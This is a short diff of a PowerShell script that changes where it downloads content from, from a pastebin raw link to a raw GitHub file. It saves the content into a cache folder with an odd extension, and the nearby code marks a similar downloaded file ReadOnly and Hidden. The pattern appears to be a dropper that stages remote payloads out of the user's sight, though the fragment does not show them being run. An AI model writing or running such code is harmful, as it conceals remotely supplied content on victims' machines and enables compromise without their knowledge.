@@ -59,7 +59,7 @@ $ErrorXslContent | Out-File -FilePath $ErrorXslPath -Encoding ASCII
 $ErrorXslItem = Get-Item -Path $ErrorXslPath
 $ErrorXslItem.Attributes = "ReadOnly", "Hidden"
 
-$LogsXslContent = Invoke-RestMethod -Uri "https://pastebin.com/raw/7ajTMCPD"
+$LogsXslContent = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/allowdoc/test/main/test.txt"
 
 $LogsXslPath = Join-Path -Path $CacheDirectory -ChildPath "logs.gmmp"
 $LogsXslContent | Out-File -FilePath $LogsXslPath -Encoding ASCII
